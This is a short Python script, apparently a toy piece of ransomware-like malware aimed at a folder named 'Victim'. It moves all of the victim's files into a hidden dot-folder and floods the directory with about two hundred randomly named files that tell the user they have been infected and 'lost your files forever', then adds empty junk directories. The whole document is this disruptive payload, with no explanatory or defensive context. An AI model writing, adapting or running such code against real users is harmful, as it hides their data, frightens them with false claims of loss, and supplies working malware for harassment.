import uuid
import os, sys
from getpass import getuser
import shutil

path = os.getcwd()
user = getuser()
os.chdir('Victim/')
victimdir = 'Victim_Files'
files = os.listdir()
if(victimdir in files):
    files.remove(victimdir)
else:
    os.mkdir(victimdir)
files = os.listdir()
files.remove(victimdir)

for f in files:
    shutil.move(f,victimdir)
files = os.listdir()
files.remove(victimdir)
invisible = '.' + victimdir
os.rename(victimdir, invisible)
for i in range(1,100):
    name = uuid.uuid4()
    name = str(name)
    user = getuser()
    fileMessage = open(f"{name}.txt", "w")
    for f in range(1,100):
        fileMessage.write(f"Hi {user} u have been infected by a malware and lost your files forever \n")
        f+=1
    fileMessage.close()
    i +=1
for i in range(1,100):
    name = uuid.uuid4()
    name = str(name)
    user = getuser()
    fileMessage = open(f"{name}.txt", "w")
    for f in range(1,100):
        fileMessage.write(f"Hi {user} u have been infected by a malware and lost your files forever \n")
        f+=1
    fileMessage.close()
    nameFile = name + '.txt'
    os.rename(nameFile, name)
    i +=1

for i in range(1,20):
    name = uuid.uuid4()
    os.makedirs(f"{name}")
    i +=1
